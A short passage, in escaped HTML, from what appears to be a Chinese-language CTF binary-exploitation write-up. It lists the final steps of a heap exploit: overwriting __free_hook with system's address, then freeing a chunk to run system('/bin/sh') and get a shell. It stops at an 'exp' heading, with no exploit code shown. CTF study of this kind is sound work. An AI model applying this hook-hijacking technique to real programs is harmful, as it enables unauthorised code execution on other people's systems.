&lt;li&gt;修改&lt;kbd&gt;free_hook&lt;/kbd&gt;成为&lt;kbd&gt;system&lt;/kbd&gt;函数的地址，&lt;s&gt;这题保护全开只能改&lt;kbd&gt;free_hook&lt;/kbd&gt;，不然还可以改 atoi 函数&lt;/s&gt;&lt;/li&gt;
&lt;li&gt;删除第四个块，执行 system (&amp;quot;/bin/sh&amp;quot;) 成功 getshell&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;exp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exp&#34;&gt;#&lt;/a&gt; exp&lt;/h2&gt;
